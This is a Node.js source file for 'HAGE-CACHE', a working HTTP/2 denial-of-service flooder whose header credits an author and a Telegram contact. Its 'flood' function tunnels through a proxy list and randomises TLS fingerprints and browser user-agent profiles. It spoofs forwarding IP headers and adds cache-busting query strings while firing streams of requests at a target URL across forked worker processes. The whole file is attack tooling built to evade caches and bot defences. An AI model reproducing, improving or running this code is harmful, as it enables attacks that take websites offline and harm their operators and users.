// =============================================================================
// HAGE-CACHE - HageService User Agent Masking
// =============================================================================
// Script Author: Hage (@HanZitt)
// Telegram: @hagec2
// Last Updated: 2025-04-11
// =============================================================================

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const HPACK = require("hpack");

// -------------------------------
// Configuration & Constants
// -------------------------------

const GREASE = "GREASE:";
const DEFAULT_CIPHERS = crypto.constants.defaultCoreCipherList.split(":");
const CIPHERS = `${GREASE}${[DEFAULT_CIPHERS[2], DEFAULT_CIPHERS[1], DEFAULT_CIPHERS[0], ...DEFAULT_CIPHERS.slice(3)].join(":")}`;

const SECURE_OPTIONS = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE;

const SECURE_PROTOCOL = "TLS_method";
const ECDH_CURVE = "GREASE:X25519:P-256:P-384:P-521:X448:secp256k1";
const MAX_RAM_PERCENT = 80;
const RESTART_DELAY_MS = 1000;

// -------------------------------
// Header Pools
// -------------------------------

const ACCEPT_HEADERS = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,application/signed-exchange;v=b3;q=0.7,*/*;q=0.6',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/heic,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.8,*/*;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.8,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*',
    'text/html,application/xhtml+xml,*/*;q=0.9',
    'text/html,*/*;q=0.9',
    'text/html,*/*',
    'application/xhtml+xml,application/xml;q=0.9,*/*',
    'application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9,*/*;q=0.8',
    'application/json,application/xml,text/html;q=0.9,*/*;q=0.8',
    'application/xhtml+xml,text/html;q=0.9,application/xml;q=0.8,*/*;q=0.7',
    'image/avif,image/webp,image/apng,image/*,*/*;q=0.8',
    'image/webp,image/apng,image/*,*/*;q=0.8',
    'image/avif,image/webp,*/*;q=0.8',
    'image/jxl,image/avif,image/webp,*/*;q=0.8',
    'image/*,*/*;q=0.8',
    'video/mp4,video/webm,video/*,*/*;q=0.8',
    'audio/mpeg,audio/ogg,audio/*,*/*;q=0.8',
    'video/mp4,audio/mpeg,image/webp,*/*;q=0.8',
    '*/*;q=0.8', '*/*;q=0.9', '*/*;q=1.0', '*/*', '*',
    'application/json,text/html;q=0.9,application/xml;q=0.8,*/*;q=0.7',
    'application/json,application/xml,text/xml,*/*;q=0.8',
    'application/json,text/plain,*/*;q=0.8',
    'application/xml,text/xml,text/html;q=0.9,*/*;q=0.8',
    'text/xml,application/xml,application/xhtml+xml;q=0.9,*/*;q=0.8',
    'text/html,text/plain,text/css,*/*;q=0.8',
    'text/html,text/*,*/*;q=0.8',
    'text/*,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,application/json;q=0.8,*/*;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,application/json;q=0.8,*/*;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,application/json,application/javascript;q=0.8,*/*;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.95,image/avif,image/webp;q=0.9,image/apng;q=0.8,*/*;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.8,image/webp;q=0.9,*/*;q=0.7',
    'text/html;q=1.0,application/xhtml+xml;q=0.9,application/xml;q=0.8,image/*;q=0.7,*/*;q=0.6',
    'text/html;q=0.9,application/xhtml+xml;q=0.8,application/xml;q=0.7,*/*;q=0.6',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,charset=utf-8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.8,*/*;q=0.7',
    'text/html,application/xhtml+xml,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,application/signed-exchange;v=b3;q=0.8,*/*;q=0.6',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,image/webp,application/xml;q=0.9,application/xhtml+xml;q=0.8,*/*;q=0.7',
    'application/xhtml+xml,text/html,image/avif,image/webp,application/xml;q=0.9,*/*;q=0.8',
    'image/webp,image/avif,image/apng,image/jxl,image/*,*/*;q=0.8',
    'application/json,application/xml,text/html,text/plain,*/*;q=0.8',
    'video/webm,video/mp4,audio/ogg,audio/mpeg,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml,image/webp,image/avif,*/*',
    'text/html,application/xhtml+xml,application/xml,image/*,*/*',
    'text/html,application/xhtml+xml,*/*',
    '*/*;q=0.8,image/apng,image/webp,image/avif,application/xml;q=0.9,application/xhtml+xml,text/html',
    '*/*;q=0.8,application/xml;q=0.9,application/xhtml+xml,text/html',
    'text/html', 'application/xhtml+xml', 'application/xml', 'image/webp', 'image/avif', 'application/json', 'text/plain',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif;q=0.95,image/webp;q=0.9,image/apng;q=0.85,application/signed-exchange;v=b3;q=0.8,application/json;q=0.75,*/*;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp;q=0.95,image/avif;q=0.9,application/json;q=0.85,application/javascript;q=0.8,*/*;q=0.75'
];

const CACHE_HEADERS = [
    'max-age=0', 'no-cache', 'no-store', 'no-cache, no-store', 'no-cache, no-store, must-revalidate',
    'no-cache, no-store, max-age=0, must-revalidate', 'no-cache, no-store, private, must-revalidate',
    'no-cache, no-store, private, max-age=0, must-revalidate', 'no-cache, private, must-revalidate',
    'no-cache, private, max-age=0', 'public, max-age=3600', 'public, max-age=7200', 'public, max-age=14400',
    'public, max-age=28800', 'public, max-age=86400', 'public, max-age=604800', 'public, s-maxage=3600',
    'public, s-maxage=7200', 'public, s-maxage=86400', 'public, s-maxage=604800', 'private, max-age=3600',
    'private, max-age=7200', 'private, max-age=14400', 'private, max-age=28800', 'private, max-age=86400',
    'private, max-age=604800', 'private, no-cache', 'private, no-store', 'private, must-revalidate',
    'must-revalidate', 'must-revalidate, max-age=3600', 'must-revalidate, max-age=86400',
    'must-revalidate, proxy-revalidate', 'must-revalidate, proxy-revalidate, max-age=3600',
    'proxy-revalidate', 'proxy-revalidate, max-age=3600', 'proxy-revalidate, must-revalidate',
    'proxy-revalidate, s-maxage=3600', 's-maxage=300', 's-maxage=600', 's-maxage=1800', 's-maxage=3600',
    's-maxage=7200', 's-maxage=86400', 's-maxage=604800', 's-maxage=2592000',
    'max-age=60', 'max-age=300', 'max-age=600', 'max-age=900', 'max-age=1800', 'max-age=2700', 'max-age=3600',
    'max-age=5400', 'max-age=7200', 'max-age=10800', 'max-age=14400', 'max-age=21600', 'max-age=28800',
    'max-age=43200', 'max-age=86400', 'max-age=172800', 'max-age=259200', 'max-age=604800', 'max-age=1209600',
    'max-age=2592000', 'max-age=3600, stale-while-revalidate=7200', 'max-age=86400, stale-while-revalidate=604800',
    'max-age=604800, stale-while-revalidate=2592000', 'stale-while-revalidate=3600', 'stale-while-revalidate=86400',
    'max-age=3600, stale-if-error=86400', 'max-age=86400, stale-if-error=604800', 'stale-if-error=3600',
    'stale-if-error=86400', 'max-age=31536000, immutable', 'max-age=604800, immutable', 'immutable',
    'public, max-age=31536000, immutable', 'no-transform', 'no-transform, max-age=3600', 'no-transform, no-cache',
    'no-transform, public, max-age=3600', 'only-if-cached', 'only-if-cached, max-stale=3600',
    'max-stale=300', 'max-stale=600', 'max-stale=3600', 'max-stale=86400', 'max-stale=604800',
    'min-fresh=300', 'min-fresh=600', 'min-fresh=3600', 'min-fresh=86400',
    'pre-check=0', 'post-check=0', 'pre-check=0, post-check=0', 'pre-check=300, post-check=300',
    'pre-check=3600, post-check=3600', 'pre-check=0, post-check=0, max-age=0',
    'no-cache, no-store, must-revalidate, max-age=0, pre-check=0, post-check=0',
    'public, max-age=3600, must-revalidate, stale-while-revalidate=7200',
    'private, max-age=86400, must-revalidate, stale-if-error=604800',
    'no-cache, private, must-revalidate, proxy-revalidate', 'public, s-maxage=604800, max-age=3600, must-revalidate',
    'private, no-cache, no-store, max-age=0, must-revalidate, proxy-revalidate',
    'public, max-age=31536000, immutable, stale-while-revalidate=2592000',
    'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0',
    'public, max-age=604800, s-maxage=2592000, stale-while-revalidate=86400',
    'private, max-age=3600, must-revalidate, stale-if-error=86400',
    'no-cache, no-store, private', 'no-cache, private, max-age=0, must-revalidate',
    'private, max-age=0, must-revalidate', 'no-cache, max-age=0, must-revalidate',
    'no-store, max-age=0, must-revalidate', 'public, s-maxage=3600, max-age=300',
    'public, s-maxage=86400, max-age=3600', 'public, s-maxage=604800, max-age=86400',
    's-maxage=3600, max-age=300, must-revalidate', 'public, max-age=3600, stale-while-revalidate=7200',
    'private, max-age=1800, must-revalidate', 'no-cache, no-store, max-age=0, must-revalidate',
    'no-cache, no-store, must-revalidate', 'no-cache, max-age=0', 'private, no-cache, no-store',
    'max-age=0, must-revalidate', 'no-cache, no-store, private', 'no-cache, private', 'no-store, private',
    'must-revalidate, max-age=0', 'proxy-revalidate, max-age=0', '', 'max-age=31536000',
    'max-age=0, no-cache', 'no-cache, no-store, private, max-age=0, must-revalidate, proxy-revalidate, pre-check=0, post-check=0',
    'public, max-age=31536000, immutable, stale-while-revalidate=31536000, stale-if-error=31536000'
];

const FETCH_SITE = ["same-origin", "same-site", "cross-site", "none", ""];
const FETCH_MODE = ["navigate", "same-origin", "no-cors", "cors", "websocket"];
const FETCH_DEST = [
    "document","empty","frame","iframe","image","script","style","worker","sharedworker",
    "serviceworker","font","manifest","object","embed","audio","track","video","audioworklet",
    "paintworklet","xslt","fencedframe","webidentity","json","report","texttrack","eventsource",
    "websocket","webtransport","speculationrules","unknown",""
];

const LANGUAGES = [
    'en-US,en;q=0.9','en-GB,en;q=0.8,en-US;q=0.7','fr-FR,fr;q=0.9,en;q=0.8',
    'de-DE,de;q=0.9,en;q=0.8','es-ES,es;q=0.9,en;q=0.8','zh-CN,zh;q=0.9,en;q=0.8',
    'ja-JP,ja;q=0.9,en;q=0.8','ru-RU,ru;q=0.9,en;q=0.8','pt-BR,pt;q=0.9,en;q=0.8',
    'it-IT,it;q=0.9,en;q=0.8'
];

const CIPHER_SUITES = [
    "TLS_AES_128_GCM_SHA256","TLS_AES_256_GCM_SHA384","TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_128_CCM_SHA256","TLS_AES_128_CCM_8_SHA256","ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256","ECDHE-ECDSA-AES256-GCM-SHA384","ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305","ECDHE-RSA-CHACHA20-POLY1305","ECDHE-ECDSA-AES128-SHA256",
    "ECDHE-RSA-AES128-SHA256","ECDHE-ECDSA-AES256-SHA384","ECDHE-RSA-AES256-SHA384",
    "DHE-RSA-AES128-GCM-SHA256","DHE-RSA-AES256-GCM-SHA384","DHE-RSA-CHACHA20-POLY1305",
    "DHE-RSA-AES128-SHA256","DHE-RSA-AES256-SHA256","AES128-GCM-SHA256","AES256-GCM-SHA384",
    "AES128-CCM","AES256-CCM","AES128-CCM8","AES256-CCM8","ECDHE-ECDSA-AES128-SHA",
    "ECDHE-RSA-AES128-SHA","ECDHE-ECDSA-AES256-SHA","ECDHE-RSA-AES256-SHA",
    "ECDHE-ECDSA-DES-CBC3-SHA","ECDHE-RSA-DES-CBC3-SHA","DHE-RSA-AES128-SHA",
    "DHE-RSA-AES256-SHA","DHE-RSA-DES-CBC3-SHA","DHE-RSA-CAMELLIA128-SHA",
    "DHE-RSA-CAMELLIA256-SHA","RSA-PSK-AES128-GCM-SHA256","RSA-PSK-AES256-GCM-SHA384",
    "RSA-PSK-CHACHA20-POLY1305","RSA-PSK-AES128-CBC-SHA","RSA-PSK-AES256-CBC-SHA",
    "PSK-AES128-GCM-SHA256","PSK-AES256-GCM-SHA384","PSK-CHACHA20-POLY1305",
    "PSK-AES128-CBC-SHA","PSK-AES256-CBC-SHA","PSK-3DES-EDE-CBC-SHA",
    "SRP-DSS-AES-128-CBC-SHA","SRP-RSA-AES-128-CBC-SHA","SRP-AES-128-CBC-SHA",
    "SRP-DSS-AES-256-CBC-SHA","SRP-RSA-AES-256-CBC-SHA","SRP-AES-256-CBC-SHA",
    "ECDHE-ECDSA-CAMELLIA128-SHA256","ECDHE-RSA-CAMELLIA128-SHA256",
    "ECDHE-ECDSA-CAMELLIA256-SHA384","ECDHE-RSA-CAMELLIA256-SHA384",
    "DHE-RSA-CAMELLIA128-SHA256","DHE-RSA-CAMELLIA256-SHA384","CAMELLIA128-SHA256",
    "CAMELLIA256-SHA384","SEED-SHA","IDEA-CBC-SHA","ECDHE-ECDSA-RC4-SHA",
    "ECDHE-RSA-RC4-SHA","RC4-SHA","RC4-MD5","DHE-DSS-AES128-GCM-SHA256",
    "DHE-DSS-AES256-GCM-SHA384","DHE-DSS-AES128-SHA256","DHE-DSS-AES256-SHA256",
    "DHE-DSS-AES128-SHA","DHE-DSS-AES256-SHA","DHE-DSS-DES-CBC3-SHA",
    "GOST2001-GOST89-GOST89","GOST2012-GOST8912-GOST8912","NULL-SHA256","NULL-SHA",
    "EXP-EDH-RSA-DES-CBC-SHA","EXP-EDH-DSS-DES-CBC-SHA","EXP-ADH-RC4-MD5",
    "EXP-ADH-DES-CBC-SHA","ADH-AES128-GCM-SHA256","ADH-AES256-GCM-SHA384",
    "ADH-AES128-SHA256","ADH-AES256-SHA256","ADH-AES128-SHA","ADH-AES256-SHA",
    "ADH-DES-CBC3-SHA","ADH-RC4-MD5","KRB5-DES-CBC3-SHA","KRB5-RC4-SHA",
    "KRB5-DES-CBC3-MD5","KRB5-RC4-MD5","RC4-MD5","EXP-RC4-MD5","RC2-CBC-MD5",
    "EXP-RC2-CBC-MD5","IDEA-CBC-MD5","DES-CBC-MD5","DES-CBC3-MD5",
    "EDH-RSA-DES-CBC3-SHA","EDH-DSS-DES-CBC3-SHA","ECDHE-ECDSA-AES128-CCM",
    "ECDHE-ECDSA-AES256-CCM","ECDHE-ECDSA-AES128-CCM8","ECDHE-ECDSA-AES256-CCM8",
    "ECDHE-ECDSA-BRAINPOOLP256R1-SHA256","ECDHE-ECDSA-BRAINPOOLP384R1-SHA384",
    "ECDHE-ECDSA-BRAINPOOLP512R1-SHA512","ECDHE-ECDSA-ARIA128-GCM-SHA256",
    "ECDHE-ECDSA-ARIA256-GCM-SHA384","ECDHE-RSA-ARIA128-GCM-SHA256",
    "ECDHE-RSA-ARIA256-GCM-SHA384","DHE-RSA-ARIA128-GCM-SHA256","DHE-RSA-ARIA256-GCM-SHA384",
    "ARIA128-GCM-SHA256","ARIA256-GCM-SHA384","ECDHE-SM2-SM4-CBC-SM3",
    "ECDHE-SM2-SM4-GCM-SM3","SM2-SM4-CBC-SM3","SM2-SM4-GCM-SM3"
];

const SIGNATURE_ALGORITHMS = [
    "ecdsa_secp256r1_sha256","rsa_pss_rsae_sha256","rsa_pkcs1_sha256","ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384","rsa_pkcs1_sha384","rsa_pss_rsae_sha512","rsa_pkcs1_sha512","ed25519",
    "ecdsa_secp521r1_sha512","ecdsa_brainpoolP256r1_sha256","ecdsa_brainpoolP384r1_sha384",
    "ecdsa_brainpoolP512r1_sha512","ecdsa_sha1","rsa_pkcs1_sha1","dsa_sha256","dsa_sha384",
    "dsa_sha512","dsa_sha1","rsa_pss_pss_sha256","rsa_pss_pss_sha384","rsa_pss_pss_sha512",
    "ed448","ecdsa_secp256k1_sha256","sm2_sm3","gostr34102012_256","gostr34102012_512",
    "gostr34102001","rsa_sha3_256","rsa_sha3_384","rsa_sha3_512","ecdsa_sha3_256",
    "ecdsa_sha3_384","ecdsa_sha3_512","dsa_sha3_256","dsa_sha3_384","dsa_sha3_512",
    "rsa_md5","null"
];

// -------------------------------
// Utilities
// -------------------------------

const randInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
const randChoice = arr => arr[randInt(0, arr.length - 1)];
const randStr = (len, chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789") =>
    Array.from({ length: len }, () => chars[randInt(0, chars.length - 1)]).join("");
const randIP = () => `${randInt(1, 255)}.${randInt(0, 255)}.${randInt(0, 255)}.${randInt(1, 254)}`;
const readFileLines = path => fs.existsSync(path) ? fs.readFileSync(path, 'utf8').split(/\r?\n/).filter(Boolean) : [];

// -------------------------------
// User-Agent & Browser Profiles
// -------------------------------

const UA = {
    chrome: () => {
        const v = randChoice([
            { major: 120 }, { major: 119 }, { major: 118 }, { major: 117 }, { major: 116 },
            { major: 115 }, { major: 114 }, { major: 113 }, { major: 112 }, { major: 111 }
        ]);
        const build = randInt(1000, 9999), patch = randInt(100, 999);
        const platform = randChoice([
            `Windows NT 10.0; Win64; x64`, `Windows NT 11.0; Win64; x64`,
            `X11; Linux x86_64`, `X11; Linux i686`, `Macintosh; Intel Mac OS X 10_15_7`,
            `Macintosh; Intel Mac OS X 11_6_0`, `Macintosh; Intel Mac OS X 12_0_0`
        ]);
        return `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v.major}.0.${build}.${patch} Safari/537.36`;
    },
    firefox: () => {
        const v = randChoice([121,120,119,118,117,116,115]);
        const platform = randChoice([
            `Windows NT 10.0; Win64; x64; rv:${v}.0`, `Windows NT 11.0; Win64; x64; rv:${v}.0`,
            `X11; Linux x86_64; rv:${v}.0`, `X11; Ubuntu; Linux x86_64; rv:${v}.0`,
            `Macintosh; Intel Mac OS X 10.15; rv:${v}.0`
        ]);
        return `Mozilla/5.0 (${platform}) Gecko/20100101 Firefox/${v}.0`;
    },
    safari: () => {
        const v = randChoice([{ major:17, minor:1 }, { major:17, minor:0 }, { major:16, minor:6 }]);
        const webkit = 605 + randInt(0, 9);
        const os = randChoice(["10_15_7","11_6_0","12_0_0","13_0_0","14_0_0"]);
        return `Mozilla/5.0 (Macintosh; Intel Mac OS X ${os}) AppleWebKit/${webkit}.1.15 (KHTML, like Gecko) Version/${v.major}.${v.minor} Safari/${webkit}.1.15`;
    },
    edge: () => {
        const v = randChoice([120,119,118,117]), build = randInt(100, 999);
        return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v}.0.${build}.0 Safari/537.36 Edg/${v}.0.${build}.0`;
    },
    opera: () => {
        const v = randChoice([105,104,103,102]), build = randInt(100, 999), opera = v - 15;
        return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v}.0.${build}.0 Safari/537.36 OPR/${opera}.0.${build}.0`;
    },
    custom: () => randChoice([
        `Mozilla/5.0 (Linux; Android ${randInt(10,13)}; SM-G9${randInt(10,99)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randInt(100,120)}.0.${randInt(1000,4999)}.${randInt(100,199)} Mobile Safari/537.36`,
        `Mozilla/5.0 (iPhone; CPU iPhone OS ${randInt(14,17)}_${randInt(1,3)} like Mac OS X) AppleWebKit/605.1.${randInt(10,15)} (KHTML, like Gecko) Version/${randInt(14,17)}.0 Mobile/15E148 Safari/604.1`,
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/${randInt(115,125)}.0.${randInt(1000,5999)}.${randInt(50,99)} Safari/537.36`,
        `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Vivaldi/${randInt(5,9)}.${randInt(1,3)}.${randInt(1000,2999)}.${randInt(10,49)} Safari/537.36`
    ]),
    random: () => UA[randChoice(['chrome','firefox','safari','edge','opera','custom'])]()
};

const PROFILE = {
    chrome: () => ({ ua: UA.chrome(), ch: `"Not_A Brand";v="8", "Chromium";v="${randInt(110,125)}", "Google Chrome";v="${randInt(110,125)}"`, mobile: "?0", platform: `"${randChoice(['Windows','Linux','macOS'])}"` }),
    firefox: () => ({ ua: UA.firefox() }),
    safari: () => ({ ua: UA.safari() }),
    edge: () => ({ ua: UA.edge(), ch: `"Not_A Brand";v="8", "Chromium";v="${randInt(110,125)}", "Microsoft Edge";v="${randInt(110,125)}"`, mobile: "?0", platform: '"Windows"' }),
    opera: () => ({ ua: UA.opera(), ch: `"Opera";v="${randInt(95,105)}", "Chromium";v="${randInt(110,125)}", "Not_A Brand";v="99"`, mobile: "?0", platform: '"Windows"' }),
    custom: () => ({ ua: UA.custom(), mobile: Math.random() < 0.5 ? "?1" : "?0", platform: Math.random() < 0.3 ? `"${randChoice(['Windows','Linux','macOS','Android','iOS'])}"` : null }),
    random: () => PROFILE[randChoice(['chrome','firefox','safari','edge','opera','custom'])]()
};

// -------------------------------
// TLS & HTTP/2 Helpers
// -------------------------------

const hpack = new HPACK();
const secureContext = tls.createSecureContext({ ciphers: CIPHERS, honorCipherOrder: true, secureOptions: SECURE_OPTIONS, secureProtocol: SECURE_PROTOCOL });

const tlsOptions = (socket, host) => ({
    port: 443, secure: true, ALPNProtocols: ["h2", "http/1.1"], ciphers: randChoice(CIPHER_SUITES),
    sigalgs: SIGNATURE_ALGORITHMS.join(":"), requestCert: true, socket, ecdhCurve: ECDH_CURVE,
    honorCipherOrder: Math.random() < 0.5, rejectUnauthorized: false,
    secureOptions: Math.random() < 0.3 ? SECURE_OPTIONS | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT : SECURE_OPTIONS,
    secureContext, host, servername: host, secureProtocol: SECURE_PROTOCOL,
    sessionTimeout: 300, ticketKeys: crypto.randomBytes(48)
});

const http2Settings = () => ({
    headerTableSize: randInt(4096, 65536), enablePush: false, initialWindowSize: randInt(65535, 16777215),
    maxFrameSize: randInt(16384, 16777215), maxConcurrentStreams: randInt(100, 1000),
    maxHeaderListSize: randInt(32768, 262144), enableConnectProtocol: Math.random() < 0.3
});

// -------------------------------
// Header Generators
// -------------------------------

const baseHeaders = (target) => ({
    ":authority": target.host, ":scheme": "https", ":method": "GET", "pragma": "no-cache",
    "upgrade-insecure-requests": "1", "accept-encoding": "gzip, deflate, br",
    "cache-control": randChoice(CACHE_HEADERS), "sec-fetch-mode": randChoice(FETCH_MODE),
    "sec-fetch-site": randChoice(FETCH_SITE), "sec-fetch-dest": randChoice(FETCH_DEST),
    ":path": `${target.path}?${randStr(3)}=${randStr(randInt(10,25))}&_${Date.now()}`
});

const dynamicHeaders = (profile, path) => {
    const headers = { "user-agent": profile.ua };
    if (profile.ch) {
        headers["sec-ch-ua"] = profile.ch;
        headers["sec-ch-ua-mobile"] = profile.mobile;
        if (profile.platform) headers["sec-ch-ua-platform"] = profile.platform;
    }
    if (Math.random() < 0.8) headers["accept"] = randChoice(ACCEPT_HEADERS);
    if (Math.random() < 0.7) headers["accept-language"] = randChoice(LANGUAGES);
    if (Math.random() < 0.5) headers["cache-control"] = randChoice(CACHE_HEADERS);
    if (Math.random() < 0.4) headers["dnt"] = "1";
    if (Math.random() < 0.3) headers["x-requested-with"] = "XMLHttpRequest";
    if (Math.random() < 0.4) headers["x-forwarded-for"] = randIP();
    if (Math.random() < 0.3) headers["x-forwarded-proto"] = "https";
    if (Math.random() < 0.2) headers["x-real-ip"] = randIP();
    headers[":path"] = `${path}&_${Date.now()}_${randInt(0,999)}`;
    return headers;
};

// -------------------------------
// Proxy & Attack 
// -------------------------------

class ProxyTunnel {
    static connect(options, callback) {
        const payload = `CONNECT ${options.address} HTTP/1.1\r\nHost: ${options.address}\r\nConnection: Keep-Alive\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
        const conn = net.connect({ host: options.host, port: options.port });
        conn.setTimeout(options.timeout * 600000); conn.setKeepAlive(true, 600000); conn.setNoDelay(true);

        conn.once("connect", () => conn.write(payload));
        conn.once("data", chunk => {
            const res = chunk.toString();
            res.includes("200") ? callback(conn) : callback(null, "proxy error");
        });
        conn.on("timeout", () => callback(null, "timeout"));
        conn.on("error", () => callback(null, "connect error"));
    }
}

// -------------------------------
// Main Flooder
// -------------------------------

const flood = (proxies, target, rate) => {
    const proxy = randChoice(proxies).split(":");
    const profile = PROFILE.random();
    const path = target.path + `?${randStr(3)}=${randStr(randInt(10,25))}`;

    ProxyTunnel.connect({
        host: proxy[0], port: +proxy[1], address: `${target.host}:443`, timeout: 10
    }, (conn, err) => {
        if (err || !conn) return;

        const tlsConn = tls.connect(443, target.host, tlsOptions(conn, target.host));
        const client = http2.connect(target.href, { createConnection: () => tlsConn, settings: http2Settings() });

        client.setMaxListeners(0);
        const attack = setInterval(() => {
            for (let i = 0; i < rate; i++) {
                const req = client.request(dynamicHeaders(profile, path), { weight: randInt(200, 256) });
                req.on("response", () => req.close());
                req.on("error", () => req.destroy());
                req.end();
            }
        }, 100);

        client.once("close", () => { clearInterval(attack); tlsConn.destroy(); conn.destroy(); });
        client.on("error", () => { tlsConn.destroy(); conn.destroy(); });
        tlsConn.on("error", () => { client.destroy(); conn.destroy(); });
    });
};

// -------------------------------
// CLI  Management
// -------------------------------

if (process.argv.length < 7) {
    console.log(`HAGE-CACHE - HageService User Agent Masking`);
    console.log(`Usage: node ${process.argv[1]} <target> <time> <rate> <threads> <proxy.txt>`);
    process.exit(0);
}

const [,, TARGET, TIME, RATE, THREADS, PROXY_FILE] = process.argv;
const PARSED = url.parse(TARGET);
const PROXIES = readFileLines(PROXY_FILE);

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (cluster.isMaster) {
    console.log(`HAGE-CACHE - HageService User Agent Masking`.brightBlue);
    console.log(`Target: ${TARGET} | Time: ${TIME}s | Rate: ${RATE} | Threads: ${THREADS}`.gray);
    console.log(`------------------------------------------------`.gray);

    const restart = () => {
        for (const id in cluster.workers) cluster.workers[id].kill();
        setTimeout(() => { for (let i = 0; i < THREADS; i++) cluster.fork(); }, RESTART_DELAY_MS);
    };

    setInterval(() => {
        const used = os.totalmem() - os.freemem();
        if ((used / os.totalmem()) * 100 >= MAX_RAM_PERCENT) {
            console.log(`[!] RAM: ${((used / os.totalmem()) * 100).toFixed(2)}% - Restarting`.red);
            restart();
        }
    }, 5000);

    for (let i = 0; i < THREADS; i++) cluster.fork();
} else {
    setInterval(() => flood(PROXIES, PARSED, +RATE), 1);
}

setTimeout(() => process.exit(0), +TIME * 1000);
